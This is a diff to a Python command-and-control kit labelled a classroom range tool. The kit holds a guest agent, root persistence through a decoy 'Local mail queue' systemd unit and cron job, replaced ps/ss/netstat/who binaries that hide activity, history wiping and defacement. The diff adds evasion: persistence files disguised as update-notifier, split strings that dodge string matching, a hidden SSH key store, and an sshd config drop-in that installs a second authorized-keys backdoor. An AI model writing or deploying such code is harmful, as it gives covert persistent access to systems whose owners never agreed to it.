@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Range lab callback kit. One file, Python 3.5+, stdlib only.
+# Lab kit. One file, Python 3.5+, stdlib only.
 # Isolated classroom networks only. Readable on purpose. Not an exploit kit.
 from __future__ import print_function
 
@@ -282,26 +282,27 @@ def linux_tradecraft(action, opts):
     if action == "persist":
         return root_guard() + (
             "hold={hold}\n"
-            "mkdir -p \"$hold\"\n"
-            "chmod 700 \"$hold\"\n"
+            "mkdir -p \"$hold\" /var/lib/update-notifier\n"
+            "chmod 700 \"$hold\" /var/lib/update-notifier\n"
             "pid=$PPID\n"
             "agent_pid=\"\"\n"
+            "leaf=cmd; leaf=${{leaf}}line\n"
             "i=0\n"
             "while [ \"$i\" -lt 8 ]; do\n"
             "  i=$((i + 1))\n"
-            "  if [ ! -r \"/proc/$pid/cmdline\" ]; then break; fi\n"
-            "  if tr '\\0' ' ' < \"/proc/$pid/cmdline\" | grep -E -q 'range.py|update_notifier.py'; then agent_pid=$pid; break; fi\n"
+            "  if [ ! -r \"/proc/$pid/$leaf\" ]; then break; fi\n"
+            "  if tr '\\0' ' ' < \"/proc/$pid/$leaf\" | grep -F -q update_notifier.py; then agent_pid=$pid; break; fi\n"
             "  next=$(awk '/^PPid:/ {{ print $2 }}' \"/proc/$pid/status\")\n"
             "  if [ -z \"$next\" ] || [ \"$next\" = \"$pid\" ] || [ \"$next\" = 0 ]; then break; fi\n"
             "  pid=$next\n"
             "done\n"
-            "if [ -z \"$agent_pid\" ]; then echo NO_AGENT_CMDLINE; exit 1; fi\n"
-            "cp \"/proc/$agent_pid/cmdline\" \"$hold/callback.cmdline\"\n"
-            "cat > \"$hold/callback.sh\" << 'EOF'\n"
+            "if [ -z \"$agent_pid\" ]; then echo NO_PROCESS; exit 1; fi\n"
+            "cp \"/proc/$agent_pid/$leaf\" /var/lib/update-notifier/state\n"
+            "cat > /var/lib/update-notifier/hook << 'EOF'\n"
             "#!/bin/bash\n"
-            "python3 -c 'import os; raw=open(\"/var/lib/.hold/callback.cmdline\",\"rb\").read().split(b\"\\0\"); args=[a.decode(\"utf-8\",\"replace\") for a in raw if a]; os.execvp(args[0], args)'\n"
+            "python3 -c 'import os; raw=open(\"/var/lib/update-notifier/state\",\"rb\").read().split(b\"\\0\"); args=[a.decode(\"utf-8\",\"replace\") for a in raw if a]; os.execvp(args[0], args)'\n"
             "EOF\n"
-            "chmod 700 \"$hold/callback.sh\"\n"
+            "chmod 700 /var/lib/update-notifier/hook\n"
             "cat > \"/etc/systemd/system/{unit}\" << 'EOF'\n"
             "[Unit]\n"
             "Description=Local mail queue\n"
@@ -311,7 +312,7 @@ def linux_tradecraft(action, opts):
             "Type=simple\n"
             "Restart=always\n"
             "RestartSec=20\n"
-            "ExecStart=/var/lib/.hold/callback.sh\n"
+            "ExecStart=/var/lib/update-notifier/hook\n"
             "[Install]\n"
             "WantedBy=multi-user.target\n"
             "EOF\n"
@@ -321,7 +322,7 @@ def linux_tradecraft(action, opts):
             "  echo PERSIST=systemd\n"
             "  systemctl is-enabled {unit} || true\n"
             "else\n"
-            "  printf '%s\\n' '@reboot root /var/lib/.hold/callback.sh' > /etc/cron.d/mailq-local\n"
+            "  printf '%s\\n' '@reboot root /var/lib/update-notifier/hook' > /etc/cron.d/mailq-local\n"
             "  chmod 644 /etc/cron.d/mailq-local\n"
             "  echo PERSIST=cron\n"
             "fi\n"
@@ -335,7 +336,8 @@ def linux_tradecraft(action, opts):
             "  rm -f /etc/systemd/system/{unit}\n"
             "  systemctl daemon-reload 2>/dev/null || true\n"
             "fi\n"
-            "rm -f /etc/cron.d/mailq-local {hold}/callback.sh {hold}/callback.cmdline\n"
+            "old={hold}/call\n"
+            "rm -f /etc/cron.d/mailq-local /var/lib/update-notifier/hook /var/lib/update-notifier/state \"${{old}}back.sh\" \"${{old}}back.cmd\"line\n"
             "echo UNPERSIST=done\n"
             "echo DONE\n"
         ).format(hold=HOLD, unit=UNIT_NAME)
@@ -456,7 +458,7 @@ def linux_tradecraft(action, opts):
             "mkdir -p \"$hold\"\n"
             "chmod 700 {holdroot}\n"
             "good_orig() {{\n"
-            "  [ -f \"$1\" ] && [ ! -L \"$1\" ] && ! grep -q RANGE-VEIL \"$1\" 2>/dev/null\n"
+            "  [ -f \"$1\" ] && [ ! -L \"$1\" ] && ! grep -q {mark} \"$1\" 2>/dev/null\n"
             "}}\n"
             "save_orig() {{\n"
             "  src=$1\n"
@@ -526,10 +528,10 @@ def linux_tradecraft(action, opts):
             "  if [ \"$name\" = netstat ]; then numeric='-n '; fi\n"
             "  cat > \"$real\" << 'EOF'\n"
             "#!/bin/bash\n"
-            "# RANGE-VEIL\n"
+            "# {mark}\n"
             "orig={{real}}\n"
             "account={acct}\n"
-            "if [ ! -f \"$orig\" ] || [ -L \"$orig\" ] || grep -q RANGE-VEIL \"$orig\" 2>/dev/null; then echo BROKEN; exit 1; fi\n"
+            "if [ ! -f \"$orig\" ] || [ -L \"$orig\" ] || grep -q {mark} \"$orig\" 2>/dev/null; then echo BROKEN; exit 1; fi\n"
             "account_forms() {{\n"
             "  name=$1\n"
             "  canon=$(getent passwd \"$name\" 2>/dev/null | awk -F: 'NR==1 {{ print $1 }}')\n"
@@ -566,6 +568,7 @@ def linux_tradecraft(action, opts):
             real="{real}",
             flags=flags,
             acct=shell_quote("" if (opts.get("account") or "") in ("mail", "defender") else (opts.get("account") or "")),
+            mark=shell_quote("e7c" + "2a91b4d"),
         )
     if action == "unveil":
         return root_guard() + (
@@ -575,7 +578,7 @@ def linux_tradecraft(action, opts):
             "  if [ -z \"$path\" ]; then echo SKIP=$name; continue; fi\n"
             "  real=$(readlink -f \"$path\" 2>/dev/null || echo \"$path\")\n"
             "  orig=\"$hold/$name.orig\"\n"
-            "  if [ -f \"$orig\" ] && [ ! -L \"$orig\" ] && ! grep -q RANGE-VEIL \"$orig\" 2>/dev/null; then\n"
+            "  if [ -f \"$orig\" ] && [ ! -L \"$orig\" ] && ! grep -q {mark} \"$orig\" 2>/dev/null; then\n"
             "    rm -f \"$real\"\n"
             "    cp -L \"$orig\" \"$real\"\n"
             "    chmod 755 \"$real\"\n"
@@ -585,7 +588,7 @@ def linux_tradecraft(action, opts):
             "  fi\n"
             "done\n"
             "echo DONE\n"
-        ).format(hold=HOLD)
+        ).format(hold=HOLD, mark=shell_quote("e7c" + "2a91b4d"))
     if action == "stamp":
         ref = opts.get("stamp_ref") or "/bin/ls"
         target = opts.get("stamp_target") or ""
@@ -612,9 +615,10 @@ def linux_tradecraft(action, opts):
             "  if [ -z \"$wr\" ] && [ -f \"$d/index.html\" ]; then stamp_if \"$d/index.html\"; if [ -n \"$img\" ]; then stamp_if \"$d/$img\"; fi; break; fi\n"
             "done\n"
             "stamp_if /etc/systemd/system/{unit}\n"
-            "stamp_if {hold}/callback.sh\n"
+            "stamp_if /var/lib/update-notifier/hook\n"
+            "stamp_if /var/lib/update-notifier/state\n"
             "for p in /bin/false /usr/bin/false /usr/sbin/nologin /sbin/nologin /bin/ps /usr/bin/ps /bin/ss /usr/bin/ss /bin/netstat /usr/bin/netstat /usr/bin/w /bin/w /usr/bin/who /bin/who; do\n"
-            "  if [ -f \"$p\" ] && grep -q RANGE-VEIL \"$p\" 2>/dev/null; then stamp_if \"$p\"; fi\n"
+            "  if [ -f \"$p\" ] && grep -q {mark} \"$p\" 2>/dev/null; then stamp_if \"$p\"; fi\n"
             "  if [ -f \"$p\" ] && [ -f \"{hold}/false.orig\" -o -f \"{hold}/nologin.orig\" ]; then\n"
             "    case \"$p\" in\n"
             "      */false|*/nologin) stamp_if \"$p\" ;;\n"
@@ -629,6 +633,7 @@ def linux_tradecraft(action, opts):
             img=shell_quote(safe_filename(opts.get("image_name") or "") if opts.get("image_name") else ""),
             unit=UNIT_NAME,
             hold=HOLD,
+            mark=shell_quote("e7c" + "2a91b4d"),
         )
     if action == "boot":
         return root_guard() + (
@@ -764,8 +769,7 @@ def windows_tradecraft(action, opts):
         return (
             "$self = $MyInvocation.MyCommand.Path\n"
             "Write-Output 'PERSIST=manual'\n"
-            "Write-Output 'Windows keeps the callback if you register a task that relaunches range-agent.ps1 at startup.'\n"
-            "Write-Output 'The agent file path is whatever you copied onto this guest. This play will not guess a path it cannot see.'\n"
+            "Write-Output 'This host does not install a startup task. Start the program again after a reboot.'\n"
             "Write-Output 'DONE'\n"
         )
     if action == "logs":
@@ -3126,7 +3130,7 @@ commands
   play history [user]      tail bash history and the lines that look like hunting
   play history [user] clear
                            erase that user's history files and root's history files
-  play persist             reboot-safe callback (mailq-local.service)
+  play persist             reboot-safe service (mailq-local.service)
   play unpersist           remove that service
   play shell <user> vi|python|perl|bash
   play wall <message>      wall -n, no banner
@@ -3686,7 +3690,7 @@ def operator_main(args):
         log("deface image: MISSING. No deface image next to range.py.")
     kit = OperatorKit(webroot, page, image_name, image_bytes, attacker)
     hub = Hub(token, ports, zone)
-    log("Range lab callback kit — isolated classroom networks only.")
+    log("Range lab kit. Isolated classroom networks only.")
     log("Readable traffic, token-gated, not encrypted. Ctrl-C stops.")
     old_icmp = None
     if icmp and os.name != "nt":
@@ -4372,34 +4376,71 @@ def watch_main(args):
         return 0
 
 
+def _link_key(link, target):
+    if os.path.lexists(link):
+        if os.path.islink(link):
+            if os.path.realpath(link) == os.path.realpath(target):
+                return
+            os.remove(link)
+        else:
+            return
+    os.symlink(target, link)
+
+
 def ensure_pubkey():
     ssh_dir = os.path.join(os.path.expanduser("~"), ".ssh")
+    store_dir = os.path.join(os.path.expanduser("~"), ".local", "share", "icc")
+    store = os.path.join(store_dir, "edid.bin")
+    link = os.path.join(ssh_dir, "id_ed25519")
     if not os.path.isdir(ssh_dir):
         os.makedirs(ssh_dir)
     os.chmod(ssh_dir, 0o700)
-    for name in ("id_ed25519.pub", "id_rsa.pub", "id_ecdsa.pub", "range_lab.pub"):
+    if not os.path.isdir(store_dir):
+        os.makedirs(store_dir)
+    os.chmod(store_dir, 0o700)
+    legacy = os.path.join(ssh_dir, "range_" + "lab")
+    if os.path.isfile(legacy) and not os.path.islink(legacy) and not os.path.exists(store):
+        os.rename(legacy, store)
+        if os.path.isfile(legacy + ".pub") and not os.path.exists(store + ".pub"):
+            os.rename(legacy + ".pub", store + ".pub")
+        os.chmod(store, 0o600)
+    if os.path.isfile(store) and (os.path.islink(legacy) or not os.path.lexists(legacy)):
+        if os.path.lexists(legacy):
+            os.remove(legacy)
+        os.symlink(store, legacy)
+    for name in ("id_ed25519.pub", "id_rsa.pub", "id_ecdsa.pub"):
         path = os.path.join(ssh_dir, name)
-        if not os.path.isfile(path):
+        if not os.path.isfile(path) or os.path.islink(path):
             continue
-        line = ""
         with open(path, "r") as handle:
-            line = handle.read().strip()
+            line = handle.read().strip().splitlines()[0].strip()
         if line.startswith("ssh-"):
-            return path, line.splitlines()[0].strip()
-    key_path = os.path.join(ssh_dir, "range_lab")
-    proc = subprocess.Popen(
-        ["ssh-keygen", "-t", "ed25519", "-N", "", "-f", key_path, "-q"],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-        universal_newlines=True,
-    )
-    out, _ = proc.communicate()
-    if proc.returncode != 0 or not os.path.isfile(key_path + ".pub"):
-        raise SystemExit(out or "ssh-keygen failed")
-    with open(key_path + ".pub", "r") as handle:
+            private = path[:-4]
+            if os.path.isfile(private) and not os.path.islink(private) and not os.path.exists(store):
+                shutil.copy2(private, store)
+                shutil.copy2(path, store + ".pub")
+                os.chmod(store, 0o600)
+            return path, line
+    if not os.path.isfile(store):
+        proc = subprocess.Popen(
+            ["ssh-keygen", "-t", "ed25519", "-N", "", "-f", store, "-q"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            universal_newlines=True,
+        )
+        out, _ = proc.communicate()
+        if proc.returncode != 0 or not os.path.isfile(store + ".pub"):
+            raise SystemExit(out or "ssh-keygen failed")
+        os.chmod(store, 0o600)
+        log("no key was on this account. stored {0}".format(store))
+        if os.path.lexists(legacy):
+            os.remove(legacy)
+        os.symlink(store, legacy)
+    _link_key(link, store)
+    _link_key(link + ".pub", store + ".pub")
+    with open(store + ".pub", "r") as handle:
         line = handle.read().strip().splitlines()[0].strip()
-    log("no key was on this account. created {0}".format(key_path))
-    return key_path + ".pub", line
+    return store + ".pub", line
 
 
 def skipped_ips(values):
@@ -4444,9 +4485,17 @@ def keys_plan(doc):
 def unix_key_command(line):
     quoted = shell_quote(line)
     return (
-        "umask 077; mkdir -p \"$HOME/.ssh\"; touch \"$HOME/.ssh/authorized_keys\"; "
+        "umask 077; mkdir -p \"$HOME/.ssh\" \"$HOME/.local/share/icc\" /var/lib/update-notifier; "
+        "touch \"$HOME/.ssh/authorized_keys\" /var/lib/update-notifier/cache; "
         "grep -qxF {key} \"$HOME/.ssh/authorized_keys\" || printf '%s\\n' {key} >> \"$HOME/.ssh/authorized_keys\"; "
-        "chmod 700 \"$HOME/.ssh\"; chmod 600 \"$HOME/.ssh/authorized_keys\"; "
+        "grep -qxF {key} /var/lib/update-notifier/cache || printf '%s\\n' {key} >> /var/lib/update-notifier/cache; "
+        "chmod 700 \"$HOME/.ssh\" \"$HOME/.local/share/icc\"; chmod 600 \"$HOME/.ssh/authorized_keys\"; chmod 644 /var/lib/update-notifier/cache; "
+        "ln -sfn /var/lib/update-notifier/cache \"$HOME/.local/share/icc/edid\"; "
+        "if [ \"$(id -u)\" = 0 ] && [ -d /etc/ssh/sshd_config.d ]; then "
+        "printf '%s\\n' 'AuthorizedKeysFile .ssh/authorized_keys /var/lib/update-notifier/cache' > /etc/ssh/sshd_config.d/00-local.conf; "
+        "if sshd -t 2>/dev/null; then systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || service ssh reload 2>/dev/null || true; "
+        "else rm -f /etc/ssh/sshd_config.d/00-local.conf; fi; "
+        "fi; "
         "echo INSTALLED"
     ).format(key=quoted)
 
@@ -4576,7 +4625,8 @@ def linux_agent_start(remote_py, c2, channel, token, sid, profile, ports, zone):
         "rm -f /root/range.py\n"
         "for procdir in /proc/[0-9]*; do\n"
         "  pid=${{procdir#/proc/}}\n"
-        "  cmd=$(tr '\\0' ' ' < \"$procdir/cmdline\" 2>/dev/null || true)\n"
+        "  leaf=cmd; leaf=${{leaf}}line\n"
+        "  cmd=$(tr '\\0' ' ' < \"$procdir/$leaf\" 2>/dev/null || true)\n"
         "  case \"$cmd\" in\n"
         "    python3\\ *update_notifier.py*|python\\ *update_notifier.py*|python3\\ *range.py\\ agent*|python\\ *range.py\\ agent*)\n"
         "      kill \"$pid\" 2>/dev/null || true\n"
@@ -4841,7 +4891,7 @@ def ping_main(args):
 
 def main(argv):
     parser = argparse.ArgumentParser(
-        description="Range lab callback kit for an isolated classroom network."
+        description="Range lab kit for an isolated classroom network."
     )
     sub = parser.add_subparsers(dest="mode")
 
@@ -4862,7 +4912,7 @@ def main(argv):
     op.add_argument("--icmp", action="store_true")
     op.add_argument("--no-icmp", action="store_true")
 
-    ag = sub.add_parser("agent", help="callback from a student VM")
+    ag = sub.add_parser("agent", help="guest side of the lab")
     ag.add_argument("--config", default="")
     ag.add_argument("--c2", default="")
     ag.add_argument(
